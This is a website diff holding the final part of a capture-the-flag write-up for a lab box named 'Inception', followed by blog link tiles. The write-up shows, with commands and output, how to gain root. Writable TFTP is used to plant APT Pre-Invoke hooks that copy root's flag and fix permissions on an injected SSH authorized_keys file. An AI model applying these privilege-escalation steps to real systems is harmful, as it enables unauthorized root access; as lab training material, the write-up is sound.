+
+root@Inception:~# cat crontab
+...
+# m h dom mon dow user	command
+17 *	* * *	root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+*/5 *	* * *	root	apt update 2&gt;&amp;1 &gt;/var/log/apt/custom.log
+30 23	* * *	root	apt upgrade -y 2&gt;&amp;1 &gt;/dev/null
+...</code></pre></div></div></p>
+
+<p>We see that we have also TFTP access with writing permissions to create new files (in contrast our FTP access is read only):
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">--create, -c
+      Allow new files to be created.   By  default,  tftpd  will  only
+      allow  upload  of  files  that already exist.  Files are created
+      with default permissions allowing anyone to read or write  them,
+      unless the --permissive or --umask options are specified.</code></pre></div></p>
+
+<p>We have also a very interesting cron job which is executed every 5 minutes:
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">...
+*/5 *	* * *	root	apt update 2&gt;&amp;1 &gt;/var/log/apt/custom.log
+...</code></pre></div></p>
+
+<h2 id="getting-root-flag">Getting root flag</h2>
+
+<p>Now, read this: <a href="https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/" target="_blank">https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/</a>
+We can add some hooks to run a command or script after running apt-get by adding or editing files inside the /etc/apt/apt.conf.d/ directory:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@Inception:/dev/shm# echo &#39;APT::Update::Pre-Invoke {&#34;/bin/cp /root/root.txt /dev/shm/flag; chmod 755 /dev/shm/flag&#34;};&#39; &gt; 100update
+root@Inception:/dev/shm# tftp 192.168.0.1
+tftp&gt; put 100update /etc/apt/apt.conf.d/100update
+Sent 56 bytes in 0.0 seconds
+tftp&gt; q</code></pre></div></div></p>
+
+<p>Now wait a little and the use ftp to read the flag:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@Inception:~# ftp 192.168.0.1 
+ftp&gt; cd /dev/shm
+ftp&gt; get flag
+ftp&gt; bye
+root@Inception:~# cat root.txt
+8d1e2e91de427a6fc1a9dc309d563359</code></pre></div></div></p>
+
+<h2 id="getting-root-shell-on-192-168-0-1-via-ssh">Getting root shell (on 192.168.0.1 via SSH)</h2>
+
+<p>We can create a private/public key pair for our user:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@Inception:/home# cd /root/.ssh
+root@Inception:~/.ssh# ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa): 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /root/.ssh/id_rsa.
+Your public key has been saved in /root/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:o34Av3ZHFt2bC3ZW7A2Q7wlaARTZzXqkeAnf7+w8AcE root@Inception
+The key&#39;s randomart image is:
++---[RSA 2048]----+
+|         .+=.+   |
+|          o =E+  |
+|           = @.. |
+|    .     o X.* o|
+|     o  S  = +.O.|
+|      o. .+ o B.+|
+|      .o o . + +.|
+|     .o o .   .oo|
+|     ..o .     .+|
++----[SHA256]-----+
+
+root@Inception:~/.ssh# ls
+id_rsa  id_rsa.pub  known_hosts</code></pre></div></div></p>
+
+<p>Then we can upload our public key on 192.168.0.1:/id_rsa.pub /root/.ssh/authorized_keys using TFTP. The problem with this approach is that TFTP creates the file with too broad permissions (anyone is allowed to read or write it). SSH public keys fail if authorized_keys has incorrect permissions. But, we can use our previous apt trick to set the correct permissions:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@Inception:~/.ssh# echo &#39;APT::Update::Pre-Invoke {&#34;chmod 600 /root/.ssh/authorized_keys&#34;};&#39; &gt; 10update
+root@Inception:~/.ssh# tftp 192.168.0.1
+tftp&gt; put id_rsa.pub /root/.ssh/authorized_keys
+Sent 397 bytes in 0.0 seconds
+tftp&gt; put 10update /etc/apt/apt.conf.d/10update
+Sent 67 bytes in 0.0 seconds
+tftp&gt; q</code></pre></div></div></p>
+
+<p>Now wait a little and then you can connect to 192.168.0.1 as root via SSH:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@Inception:~/.ssh# ssh root@192.168.0.1
+Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+root@Inception:~# cat root.txt
+8d1e2e91de427a6fc1a9dc309d563359</code></pre></div></div></p>
 
         </div>
 
         <aside>
           <div class="p-share centered">
-            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2fmicrovilli%2f&t=Microvilli%20%28available%20in%20greek%20only%29" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
-            <a href="https://plus.google.com/share?url=https%3a%2f%2falamot.github.io%2fmicrovilli%2f" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-google-plus"></i></a>
-            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fmicrovilli%2f&text=Microvilli%20%28available%20in%20greek%20only%29&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
-            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fmicrovilli%2f&text=%ce%9c%ce%b9%ce%ba%cf%81%ce%bf%ce%bb%ce%ac%cf%87%ce%bd%ce%b5%cf%82&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
-            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fmicrovilli%2f&description=Microvilli%20%28available%20in%20greek%20only%29&media=https://alamot.github.io/images/microvilli.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
-            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fmicrovilli%2f&description=%ce%9c%ce%b9%ce%ba%cf%81%ce%bf%ce%bb%ce%ac%cf%87%ce%bd%ce%b5%cf%82&media=https://alamot.github.io/images/microvilli.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
+            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2finception_writeup%2f&t=Inception%20write-up" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
+            <a href="https://plus.google.com/share?url=https%3a%2f%2falamot.github.io%2finception_writeup%2f" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-google-plus"></i></a>
+            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2finception_writeup%2f&text=Inception%20write-up&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2finception_writeup%2f&text=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Inception&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2finception_writeup%2f&description=Inception%20write-up&media=https://alamot.github.io/images/mirror.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
+            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2finception_writeup%2f&description=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Inception&media=https://alamot.github.io/images/mirror.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
           </div>
         </aside>
       </article>
@@ -383,81 +718,161 @@ if (language) {
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Minion write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">10 Apr 2018</time>
+      <time lang="el">10 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Sense write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">24 Mar 2018</time>
+      <time lang="el">24 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Enterprise write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Mar 2018</time>
+      <time lang="el">19 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Node write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
           
-           
            
            
-          
-           
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Mantis write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">18 Feb 2018</time>
+      <time lang="el">18 Φεβ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
-           
-           
-          
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Nineveh write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">17 Dec 2017</time>
+      <time lang="el">17 Δεκ 2017</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
            
            
-          
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
-           
-           
-          
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -471,33 +886,81 @@ if (language) {
            
            
            
-          
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fast_commit_push/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/binary_flow.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Git &amp; Mercurial: How to commit-push fast and easily</h3>
+      <h3 class="title" lang="el">Git &amp; Mercurial: Πως να κάνετε commit-push γρήγορα και εύκολα</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">17 Oct 2016</time>
+      <time lang="el">17 Οκτ 2016</time>
+    </footer>
+  </a>
+</article>
+
            
-           
           
-           
-           
            
-          
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/nl80211/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/wifi-sign.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">How to get info for the wireless interface using nl80211 in C</h3>
+      <h3 class="title" lang="el">Πως να λάβετε πληροφορίες για την ασύρματη διεπαφή χρησιμοποιώντας την nl80211 στη C</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Oct 2016</time>
+      <time lang="el">09 Οκτ 2016</time>
+    </footer>
+  </a>
+</article>
+
            
           
-           
-           
            
-          
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/shutdown_manager_transparent/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/transparent_shutdown.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Creation of a transparent shutdown GUI using Gtk and Cairo in Python</h3>
+      <h3 class="title" lang="el">Δημιουργία μιας διαφανούς γραφικής διεπαφής κλεισίματος με τη χρήση Gtk και Cairo σε Python</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Sep 2016</time>
+      <time lang="el">19 Σεπ 2016</time>
+    </footer>
+  </a>
+</article>
+
            
           
-           
-           
            
-          
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/shutdown_manager_plain/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shutdown_button.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Creation of a shutdown GUI using Gtk in Python</h3>
+      <h3 class="title" lang="el">Δημιουργία μιας γραφικής διεπαφής κλεισίματος με τη χρήση Gtk σε Python</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">21 Jul 2016</time>
+      <time lang="el">21 Ιουλ 2016</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -839,19 +1302,15 @@ if (language) {
            
            
            
-          
           
            
            
            
-           
           
            
            
            
-           
           
-           
            
            
            
@@ -859,14 +1318,11 @@ if (language) {
            
            
            
-           
           
            
            
            
-           
           
-           
            
            
            
@@ -874,14 +1330,11 @@ if (language) {
            
            
            
-           
           
            
            
            
-           
           
-           
            
            
            
@@ -889,9 +1342,7 @@ if (language) {
            
            
            
-           
           
-           
            
            
            
@@ -899,14 +1350,11 @@ if (language) {
            
            
            
-           
           
            
            
            
-           
           
-           
            
            
            
@@ -914,17 +1362,11 @@ if (language) {
            
            
            
-           
           
            
            
            
-           
           
-           
-           
-           
-           
           
            
            
@@ -936,16 +1378,37 @@ if (language) {
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/testakia_viologias/" class="clearfix">
+  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/testakia_viologias.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Biology tests (available in greek only)</h3>
-      <h3 class="title" lang="el">Τεστάκια Βιολογίας</h3>
+      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
+      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">22 Aug 2015</time>
-      <time lang="el">22 Αυγ 2015</time>
+      <time lang="en">13 Apr 2018</time>
+      <time lang="el">13 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reverse shells</h3>
+      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">12 Apr 2018</time>
+      <time lang="el">12 Απρ 2018</time>
     </footer>
   </a>
 </article>
@@ -991,231 +1454,10 @@ if (language) {
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mindcontrol_parasites/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/brain_signals.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Mind control parasites. How do they do it?</h3>
-      <h3 class="title" lang="el">Παράσιτα που ελέγχουν το μυαλό. Πώς το κάνουν;</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 Oct 2013</time>
-      <time lang="el">03 Οκτ 2013</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
            
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/amylpred2/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/amylpred2.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">A consensus method for the prediction of aggregation-prone peptides in globular proteins</h3>
-      <h3 class="title" lang="el">Μια συναινετική μέθοδος πρόγνωσης πεπτιδίων που εμφανίζουν τάση προς συσσωμάτωση στις σφαιρικές πρωτεΐνες</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">10 Jan 2013</time>
-      <time lang="el">10 Ιαν 2013</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/ess/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/hawkdove.png);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Evolutionarily Stable Strategies (available in greek only)</h3>
-      <h3 class="title" lang="el">Εξελικτικά Σταθερές Στρατηγικές</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">01 Nov 2012</time>
-      <time lang="el">01 Νοε 2012</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/amyloids/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/amyloid.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Amyloid fibrils (available in greek only)</h3>
-      <h3 class="title" lang="el">Αμυλοειδή ινίδια</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">11 Jul 2012</time>
-      <time lang="el">11 Ιουλ 2012</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/centrioles/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/centrioles.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Centrioles (available in greek only)</h3>
-      <h3 class="title" lang="el">Κεντριόλια</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Jan 2012</time>
-      <time lang="el">22 Ιαν 2012</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/multifunctional_proteins/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/multifunction.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Multifunctional proteins and evolution (available in greek only)</h3>
-      <h3 class="title" lang="el">Πολυλειτουργικές πρωτεΐνες και εξέλιξη</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Jan 2012</time>
-      <time lang="el">17 Ιαν 2012</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/evolution_of_cetaceans/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dolphin.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">The evolution of Cetaceans (available in greek only)</h3>
-      <h3 class="title" lang="el">Η εξέλιξη των Kητωδών</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Nov 2011</time>
-      <time lang="el">17 Νοε 2011</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/smallest_genome/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/microscope.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">The organism with the smallest genome and proteome</h3>
-      <h3 class="title" lang="el">Ο οργανισμός με το μικρότερο γονιδιώμα και πρωτέωμα</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">06 Aug 2011</time>
-      <time lang="el">06 Αυγ 2011</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/entomopathogenic_fungi/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ep_fungi.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Entomopathogenic fungi (available in greek only)</h3>
-      <h3 class="title" lang="el">Εντομοπαθογόνοι μύκητες</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Nov 2010</time>
-      <time lang="el">22 Νοε 2010</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/intraspecific_and_interspecific_competition/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/competition.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Intraspecific and Interspecific competition (available in greek only)</h3>
-      <h3 class="title" lang="el">Ενδοειδικός και Διαειδικός ανταγωνισμός</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Nov 2010</time>
-      <time lang="el">17 Νοε 2010</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/theories_of_intelligence/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/intelligence.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Theories of intelligence (available in greek only)</h3>
-      <h3 class="title" lang="el">Θεωρίες νοημοσύνης</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">01 Jun 2010</time>
-      <time lang="el">01 Ιουν 2010</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1227,21 +1469,10 @@ if (language) {
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/electric_current_and_human_body/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/electric.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Electric current and human body (available in greek only)</h3>
-      <h3 class="title" lang="el">Ηλεκτρικό ρεύμα και ανθρώπινο σώμα</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">01 Jun 2009</time>
-      <time lang="el">01 Ιουν 2009</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
+           
            
           
            
@@ -1263,21 +1494,125 @@ if (language) {
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/brucellosis/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/Brucella.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Brucellosis (available in greek only)</h3>
-      <h3 class="title" lang="el">Βρουκέλλωση (Μελιταίος πυρετός)</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">21 Mar 2004</time>
-      <time lang="el">21 Μαρ 2004</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
